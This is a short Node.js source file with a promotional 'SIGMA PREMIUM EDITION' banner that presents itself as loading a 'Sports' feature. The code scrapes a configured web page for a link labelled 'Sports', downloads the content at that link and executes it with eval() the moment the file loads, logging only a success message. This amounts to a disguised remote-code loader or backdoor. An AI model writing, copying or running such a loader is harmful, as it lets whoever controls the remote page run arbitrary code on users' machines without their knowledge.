//  [SIGMA PREMIUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Ir Alpha Legrand                                    
//  >> Version: 8.3.5-sigma.14

const axios = require('axios');
const cheerio = require('cheerio');
const legrand = require(__dirname + "/../config");

async function fetchSportsUrl() {
  try {
    const response = await axios.get(legrand.SIGMA);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("Sports")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('Sports not found 😭');
    }

    console.log('Sports loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchSportsUrl();